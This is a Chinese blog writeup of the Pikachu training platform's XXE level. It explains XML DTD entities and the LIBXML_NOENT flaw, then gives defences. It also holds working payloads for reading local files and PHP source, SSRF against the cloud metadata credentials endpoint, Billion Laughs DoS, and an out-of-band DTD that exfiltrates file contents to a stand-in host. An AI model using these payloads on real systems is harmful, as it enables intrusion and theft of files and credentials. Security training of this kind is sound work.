---
layout: post
title: Pikachu - XXE 外部实体注入 Writeup（DTD 与实体）
platform: pikachu
date: 2026-10-29 20:52:00 +0800
categories: CTF
---

Pikachu - XXE 外部实体注入 Writeup（DTD 与实体）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：XXE → XXE漏洞
- 地址：`http://localhost/pikachu/vul/xxe/xxe_1.php`
- 题型：Web
- 考点：**XML 外部实体注入（XXE）**、DTD、`LIBXML_NOENT`

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
模块目录：D:\phpstudy_pro\WWW\pikachu\vul\xxe\
    xxe.php      概述页
    xxe_1.php    ★ 真正的漏洞页面
```

**页面形态**：

```text
这是一个接收xml数据的api: [                    ] [提交]
```

**作者提示**：

```html
data-content="先把XML声明、DTD文档类型定义、文档元素这些基础知识自己看一下"
```

**✅ 实测结果（5 种 payload）**

| # | payload | 结果 |
|---|---|---|
| 1 | 内部实体 `<!ENTITY hacker "ESHLkangi">` | ✅ 输出 `ESHLkangi` |
| 2 | **`file:///C:/Windows/win.ini`** | **✅ 输出 win.ini 全文** |
| 3 | `file:///etc/passwd` | ❌ 失败（Windows 上没有这个路径）|
| 4 | **`php://filter/convert.base64-encode/resource=.../config.inc.php`** | **✅ 输出 base64（PHP 源码）** |
| 5 | **`file:///C:/Windows/System32/drivers/etc/hosts`** | **✅ 输出 hosts 全文** |

**★ 第 4 行的 base64 解码后**：

```php
<?php
//全局session_start
session_start();
//全局居设置时区
date_default_timezone_set('Asia/Shanghai');
header('Content-type:text/html;charset=utf-8');
...
define('DBPW', 'root');
?>
```

二、题目分析

**① 漏洞代码：关键是一个常量**

```php
<?php
// xxe_1.php 第 42-55 行
$html = '';
//考虑到目前很多版本里面libxml的版本都>=2.9.0了,所以这里添加了LIBXML_NOENT参数开启了外部实体解析
if(isset($_POST['submit']) and $_POST['xml'] != null){
    $xml = $_POST['xml'];
    $data = @simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);   // ★ 关键常量
    if($data){
        $html .= "<pre>{$data}</pre>";          // ★ 解析结果直接输出
    }else{
        $html .= "<p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?</p>";
    }
}
?>
```

**★ 两个必要条件（本关都满足）**：

```
① 解析器允许"加载外部实体"
   本关用 LIBXML_NOENT 开启（libxml 2.9+ 默认关闭）
   
② 解析结果被"输出或使用"
   本关把 $data 直接 <pre> 输出
   ★ 如果解析结果不输出，就要用"盲 XXE"（带外）
```

**★ 作者的注释已经把"为什么加这个参数"写清楚了**：

```
"考虑到目前很多版本里面libxml的版本都>=2.9.0了,
 所以这里添加了LIBXML_NOENT参数开启了外部实体解析"
```

**② XML 的四个组成部分**

**★ 要理解 XXE，先得知道 XML 有哪些部分。**

**一个完整的 XML 文档**：

```xml
<?xml version="1.0" encoding="UTF-8"?>          <!-- ① XML 声明 -->
<!DOCTYPE note [                                 <!-- ② DTD（文档类型定义）-->
    <!ENTITY hacker "ESHLkangi">                 <!--    内部实体声明 -->
    <!ENTITY f SYSTEM "file:///etc/passwd">      <!--    外部实体声明 -->
]>
<note>                                          <!-- ③ 文档元素（根元素）-->
    <name>&hacker;</name>                        <!--    引用实体 -->
    <content>&f;</content>
</note>
<!-- ④ 注释 -->
```

**★ 对应本关的 payload**：

```xml
<?xml version="1.0"?>                                      <!-- 声明 -->
<!DOCTYPE ANY [                                            <!-- DTD 开始 -->
    <!ENTITY f SYSTEM "file:///C:/Windows/win.ini">        <!-- 外部实体 -->
]>
<x>&f;</x>                                                 <!-- 引用实体 -->
```

**★ 逐段读**：

```
<!DOCTYPE ANY [ ... ]>
          └┬┘
       DOCTYPE 的名字（随便起，不影响）

<!ENTITY f SYSTEM "file:///...">
        │ │  └──┬──┘ └──────┬──────┘
     实体名 f  类型    引用的资源
     
&f;   ← 在文档元素里"引用"这个实体
★ 解析时，&f; 会被替换成"那个文件的内容"
```

**③ DTD 实体的三种类型**

**类型 1：内部实体（值是"写死的字符串"）**

```xml
<!ENTITY hacker "ESHLkangi">
...
&hacker;
```

**★ 用途**：

```
· 普通的"宏替换"
· 本身无害，但可以用来测试"实体解析开没开"
★ 本关的 payload 1 就是这种
```

**类型 2：外部实体（值是"一个资源路径"）**

```xml
<!ENTITY f SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY f SYSTEM "http://attacker.com/x">
<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=config.php">
...
&f;
```

**★ 这是 XXE 的"核心武器"**：

```
SYSTEM "..." 里的资源可以是：
    file://       → 读本地文件
    http://       → 让服务器发请求（SSRF）
    php://filter  → 读 PHP 源码（base64 编码）
    expect://     → 执行命令（需要 expect 扩展）
    ftp://        → 走 FTP
```

**类型 3：参数实体（只能在 DTD 内部使用）**

```xml
<!ENTITY % p SYSTEM "http://attacker.com/evil.dtd">
%p;
```

**★ 特点**：

```
· 名字以 % 开头
· 只能在 DTD 里引用（用 %p; 不是 &p;）
· ★ 这是"盲 XXE"的关键（因为文档元素里不能引用参数实体）
```

**④ 什么是 `LIBXML_NOENT`**

**★ libxml 的实体解析历史**：

```
libxml 2.9.0（2013 年）之前：
    默认"解析外部实体" → XXE 漏洞到处都是

libxml 2.9.0 之后：
    默认"不解析外部实体"
    → 即使有 <!ENTITY f SYSTEM "file://...">，&f; 也不会被替换
    → XXE 被"默认防住"了
```

**★ `LIBXML_NOENT` 的作用**：

```php
simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
//                                          └──────┬──────┘
//                                        开启实体替换
```

**★ 实测对比（本环境）**：

```
带 LIBXML_NOENT     → ✅ &f; 被替换成 win.ini 内容
不带 LIBXML_NOENT   → ❌ &f; 保持为字符串（或报错）
```

**★ 还有一个"开关"**：

```php
libxml_disable_entity_loader(true);     // PHP < 8.0：全局禁用外部实体加载
libxml_disable_entity_loader(false);    // 允许
// ★ PHP 8.0 起这个函数被移除（默认就是安全的）
```

**★ 本环境（PHP 7.3.4）的实际情况**：

```
函数存在：libxml_disable_entity_loader 可调
默认行为：允许加载（未显式禁用）
★ 所以加上 LIBXML_NOENT 就能打
```

**⑤ 为什么读 PHP 源码要先用 `php://filter`**

**★ 直接读会怎样？**

```xml
<!ENTITY f SYSTEM "file:///D:/phpstudy_pro/WWW/pikachu/inc/config.inc.php">
```

**★ 问题**：

```
① config.php 里有 <?php ... ?>
   → 这些 < > 会被当成 XML 标签 → 解析出错
   
② 即使解析成功，输出的是"PHP 源码文本"
   → 但如果这段文本被"再执行"（比如 eval），就变成 RCE
   ★ 不过本关只是 <pre> 输出，不会执行
```

**★ 用 `php://filter` 编码**：

```xml
<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=D:/phpstudy_pro/WWW/pikachu/inc/config.inc.php">
```

**★ 好处**：

```
· 输出是纯 base64（没有 < > 等特殊字符）→ 不会破坏 XML
· 拿到后本地解码 → 完整源码
★ 这是"XXE 读 PHP 源码"的标准姿势
```

**★ 实测输出**：

```
PD9waHAKLy/lhajlsYBzZXNzaW9uX3N0YXJ0CnNlc3Npb25fc3RhcnQoKTsK...
```

**★ 解码**：

```python
import base64
print(base64.b64decode("PD9waHAK...").decode())
```

三、解题步骤

**第 1 步：先验证"实体解析开了没"**

**★ 输入框粘（单行也行）**：

```xml
<?xml version="1.0"?><!DOCTYPE note [<!ENTITY hacker "ESHLkangi">]><name>&hacker;</name>
```

**★ 提交 → 页面显示**：

```
ESHLkangi
```

**★ 这说明**：

```
① XML 被成功解析
② 内部实体被替换了
★ 可以继续试"外部实体"
```

**第 2 步：⭐ 读系统文件（Windows）**

```xml
<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY f SYSTEM "file:///C:/Windows/win.ini">]><x>&f;</x>
```

**★ 提交 → 页面显示**：

```ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

**★ 到这里 XXE 就打通了。**

**第 3 步：⭐ 读 hosts（更直观）**

```xml
<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY f SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><x>&f;</x>
```

**★ 能看到 hosts 全文。**

**第 4 步：⭐ 读 PHP 源码（需要 base64）**

```xml
<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=D:/phpstudy_pro/WWW/pikachu/inc/config.inc.php">]><x>&f;</x>
```

**★ 页面输出一长串 base64。**

**★ 解码（PowerShell）**：

```powershell
$b64 = "把页面上的那串粘进来"
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
```

**★ 或者 Python**：

```python
import base64
print(base64.b64decode("那串").decode())
```

**★ 解码后能看到**：

```php
define('DBUSER', 'root');
define('DBPW', 'root');
```

**★ 如果浏览器输入框打不了多行**：

```text
方法 1：用单行（上面的 payload 都是单行，可以直接粘）
方法 2：F12 把 <input> 改成 <textarea>
方法 3：用 Python / Burp 直接发 POST
```

**第 5 步：完整 payload 汇总**

```xml
// ========== ① 内部实体（测试用）==========
<?xml version="1.0"?><!DOCTYPE note [<!ENTITY hacker "ESHLkangi">]><name>&hacker;</name>

// ========== ② 读 Windows 系统文件 ==========
<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY f SYSTEM "file:///C:/Windows/win.ini">]><x>&f;</x>
<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY f SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><x>&f;</x>

// ========== ③ 读 Linux 系统文件 ==========
<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY f SYSTEM "file:///etc/passwd">]><x>&f;</x>

// ========== ④ 读 PHP 源码（base64）==========
<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=D:/phpstudy_pro/WWW/pikachu/inc/config.inc.php">]><x>&f;</x>

// ========== ⑤ SSRF（让服务器请求内网）==========
<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY f SYSTEM "http://127.0.0.1:80/">]><x>&f;</x>

// ========== ⑥ DoS（Billion Laughs，慎用）==========
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
// ★ 会消耗大量内存，可能把服务器打挂 —— 靶场里不要试
```

四、延伸知识

**① XXE 的四大利用方向**

| 方向 | payload 里的 SYSTEM | 效果 |
|---|---|---|
| **文件读取** | `file:///path` | 读服务器任意文件 |
| **SSRF** | `http://内网IP:端口` | 让服务器替你请求内网 |
| **RCE** | `expect://whoami` | 执行命令（需 expect 扩展）|
| **DoS** | 实体递归展开 | 耗尽内存（Billion Laughs）|

**★ 本关演示的是第 1 种（最常用）。**

**② SSRF：XXE 的"副业"**

**★ 本地测试**：

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [<!ENTITY f SYSTEM "http://127.0.0.1:80/pikachu/">]>
<x>&f;</x>
```

**★ 效果**：

```
服务器去请求 127.0.0.1:80/pikachu/
→ 把响应内容作为 &f; 的值返回给你
★ 这就叫"服务端请求伪造"（SSRF）
```

**★ 为什么危险**：

```
· 攻击者能从"外网"访问到"服务器内网"的服务
· 可以扫描内网端口、读内网服务的响应
· 可以打云环境的"元数据接口"（169.254.169.254）
  ★ 拿到云主机的临时密钥 → 接管云资源
```

**★ 一个真实的"云上大杀器"**：

```xml
<!ENTITY f SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

**★ 这是 AWS 的"实例元数据"接口**：

```
能拿到临时 AK/SK → 完全控制云资源
★ 2019 年 Capital One 的数据泄露就是这么来的
```

**③ 盲 XXE（OOB：当"结果不回显"时）**

**★ 如果目标"不回显解析结果"怎么办？**

```
用"带外"（Out-of-Band）技术：
① 让服务器把数据"发到你控制的地方"
② 你在自己的服务器上收到数据
```

**★ 核心技术：外部 DTD + 参数实体**

**Step 1：先试"能不能外连"**

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [<!ENTITY % f SYSTEM "http://your-server.com/probe.dtd">]>
%f;
```

**★ 如果你的服务器收到请求 → 能外连。**

**Step 2：用"外部 DTD"构造"带数据的外连"**

**★ 你的服务器上放 `evil.dtd`**：

```xml
<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://your-server.com/?data=%file;'>">
%eval;
%exfil;
```

**★ 目标端 payload**：

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [<!ENTITY % remote SYSTEM "http://your-server.com/evil.dtd">]>
%remote;
```

**★ 执行流程**：

```
① 目标加载 evil.dtd
② evil.dtd 里定义 %file = 读 win.ini
③ evil.dtd 里定义 %eval = 构造一个新实体 %exfil
④ %exfil 的 URL 里"拼上了 file 的内容"
⑤ 目标请求 http://your-server.com/?data=<win.ini内容>
⑥ 你在服务器日志里看到数据
★ 这就是"盲 XXE 带外读文件"
```

**★ 为什么这么绕？**

```
· 文档元素里不能引用"参数实体"（%开头）
· 所以要"在 DTD 内部"用"嵌套定义"来构造
· 而且 URL 里不能有特殊字符（所以要 URL 编码/用 base64）
★ 这是 XXE 里最复杂也最实用的技巧
```

**④ XXE 的防御（四层）**

**❌ 本关的做法**：

```php
$data = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);   // 开启实体替换
```

**✅ 第 1 层：不要加 `LIBXML_NOENT`**

```php
// ❌ 危险
simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);

// ✅ 安全（默认不解析实体）
simplexml_load_string($xml, 'SimpleXMLElement');
```

**★ 注意**：

```
libxml 2.9+ 默认不解析外部实体
★ 所以"什么都不加"就已经安全了
★ 很多老代码为了"兼容"加了 LIBXML_NOENT → 反而引入漏洞
```

**✅ 第 2 层：`libxml_disable_entity_loader(true)`（PHP < 8）**

```php
libxml_disable_entity_loader(true);     // 全局禁用外部实体加载
$data = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
// ★ 即使传了 NOENT，外部实体也加载不了
```

**★ PHP 8.0+**：

```
这个函数被移除了
★ 因为 libxml 2.9+ 默认就安全，不需要它了
```

**✅ 第 3 层：用"安全的解析器"**

```php
// PHP 8+：用 XMLReader 并显式禁用实体
$reader = new XMLReader();
$reader->XML($xml, null, LIBXML_NONET | LIBXML_NOERROR);
// ★ LIBXML_NONET = 禁止网络访问

// 或者用 json 代替 xml（如果业务允许）
$data = json_decode($input, true);
```

**✅ 第 4 层：白名单 + 结构校验**

```php
// 只允许"简单的、固定结构"的 XML
if (!preg_match('/^<\?xml[^>]*\?>\s*<request>\s*<user>[a-zA-Z0-9_]+<\/user>\s*<\/request>$/', $xml)) {
    die('非法的 XML 格式');
}
// ★ 用正则"精确限制结构"，比"黑名单过滤 <!ENTITY"更可靠
```

**★ 一个"反面教材"的防御**：

```php
// ❌ 黑名单过滤（能被绕过）
$xml = str_replace('<!ENTITY', '', $xml);
// 绕过：<!EN<!ENTITYTITY → 删除中间那层后变成 <!ENTITY
★ 黑名单永远能绕过
```

**⑤ 真实世界的 XXE 案例**

**案例 1：Capital One 数据泄露（2019）**

```
攻击者利用 SSRF（含 XXE 类手法）访问 AWS 元数据接口
→ 拿到临时凭证 → 读取 1 亿用户数据
★ 罚款 8000 万美元
```

**案例 2：某 OA 系统的"导入配置"**

```
功能：上传 XML 配置文件
→ 后端用 simplexml_load_string + LIBXML_NOENT
→ 攻击者传 XXE payload → 读服务器文件
```

**案例 3：某 API 的"SOAP 接口"**

```
SOAP 本身就是 XML
→ 很多老 SOAP 服务默认允许外部实体
→ 直接 XXE
```

**案例 4：Office 文档（docx/xlsx）**

```
docx 本质是"zip + xml"
→ 解析 docx 的服务可能有 XXE
→ 上传一个"含 XXE 的 docx" → 读服务器文件
★ 这类"文档解析"场景是 XXE 的重灾区
```

**⑥ XXE 与其它漏洞的"组合"**

**★ XXE + SSRF**：

```
<!-- 读内网服务 -->
<!ENTITY f SYSTEM "http://内网IP:6379/">
★ 甚至能打 Redis（如果响应格式合适）
```

**★ XXE + 文件上传**：

```
上传一个"含 XXE 的 SVG 图片"
→ 服务器用 XML 解析 SVG → 触发 XXE
★ 因为 SVG 就是 XML
```

**★ XXE + 反序列化**：

```
有些语言的 XML 解析器支持"类型转换"
→ 可以把 XML 转成对象 → 触发反序列化
★ Java 的 XStream 就有这类问题
```

五、总结

- **本题核心：`simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT)` 开启了外部实体解析 → 可以用 `<!ENTITY f SYSTEM "file://...">` 读任意文件。**

- **一段关键代码 + 一句关键注释**：

```php
//考虑到目前很多版本里面libxml的版本都>=2.9.0了,所以这里添加了LIBXML_NOENT参数开启了外部实体解析
$data = @simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
...
$html .= "<pre>{$data}</pre>";          // ★ 解析结果直接输出
```

- **⭐ 八个必记要点**：

```text
① XML 有四个部分
   声明、DTD、文档元素、注释
   ★ XXE 就藏在"DTD"里

② DTD 实体的三种类型
   内部实体：<!ENTITY x "值">         → 字符串替换
   外部实体：<!ENTITY x SYSTEM "URL"> → ★ XXE 的核心
   参数实体：<!ENTITY % x "...">      → 盲 XXE 的关键

③ LIBXML_NOENT 是"开启实体替换"的开关
   libxml 2.9+ 默认关闭
   ★ 老代码为了"兼容"加了这个参数 → 引入漏洞

④ XXE 四大利用方向
   文件读取（file://）
   SSRF（http://）
   RCE（expect://，需扩展）
   DoS（Billion Laughs）

⑤ 读 PHP 源码要用 php://filter
   php://filter/convert.base64-encode/resource=xxx.php
   ★ 避免 < > 破坏 XML 结构

⑥ 盲 XXE 用"外部 DTD + 参数实体 + 带外"
   目标不回显 → 让服务器把数据"发到你服务器"
   ★ 这是 XXE 里最复杂的技巧

⑦ 危害能到"云上"
   SSRF → http://169.254.169.254/latest/meta-data/
   → 拿云主机临时凭证 → 接管云资源
   ★ Capital One 事件就是这样

⑧ 防御：不加 LIBXML_NOENT（默认就安全）> 禁用实体加载 > 白名单
   ★ 黑名单过滤 <!ENTITY 永远能绕过
```

- **实测数据**：

```text
内部实体：
    <?xml version="1.0"?><!DOCTYPE note [<!ENTITY hacker "ESHLkangi">]><name>&hacker;</name>
    → 输出 ESHLkangi

读 win.ini：
    <?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY f SYSTEM "file:///C:/Windows/win.ini">]><x>&f;</x>
    → 输出 [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1

读 hosts：
    ...SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"...
    → 输出 hosts 全文

读 PHP 源码：
    ...SYSTEM "php://filter/convert.base64-encode/resource=D:/phpstudy_pro/WWW/pikachu/inc/config.inc.php"...
    → 输出 base64，解码后看到 DBPW: root

Linux 路径（预期失败）：
    ...SYSTEM "file:///etc/passwd"...
    → 解析失败（Windows 上没有这个文件）
```

- **进度**：

```text
platform: pikachu   40 篇（本地 106 篇）

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
├── Unsafe Fileupload   3/7    （暂停，剩 4 关）
├── Over Permission     2/2    ✅
├── 目录遍历            1/1    ✅
├── 敏感信息泄露        1/1    ✅
├── PHP 反序列化        1/1    ✅
└── XXE                 1/1    ✅  ← 刚完成（另一个难点）
```

**手工复现要点**：

```text
· 打开 xxe_1.php → 输入内部实体 payload → 看到 ESHLkangi
· 换成 file:///C:/Windows/win.ini → 看到 [fonts] MAPI=1
· 换成 hosts → 看到 # Copyright (c) 1993-2009 Microsoft Corp.
· 换成 php://filter + config.php → 拿到 base64 → 解码看 DBPW
· 单行 payload 可以直接粘进输入框（不需要多行）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  XXE = "让 XML 解析器帮你读文件/发请求"                        │
│                                                            │
│  <!DOCTYPE ANY [<!ENTITY f SYSTEM "file:///path">]>         │
│  <x>&f;</x>                                                │
│       └─ 解析时被替换成"文件内容"                              │
│                                                            │
│  ★ 开关：LIBXML_NOENT（libxml 2.9+ 默认关闭）                  │
│  ★ 读 PHP 源码要包一层 php://filter（base64）                  │
│  ★ 四大利用：读文件 / SSRF / RCE / DoS                        │
│  ★ 盲打用"外部 DTD + 参数实体 + 带外"                          │
│                                                            │
│  防御：不加 LIBXML_NOENT（默认就安全）                          │
│        黑名单过滤 <!ENTITY 永远能绕过                          │
└────────────────────────────────────────────────────────────┘
```
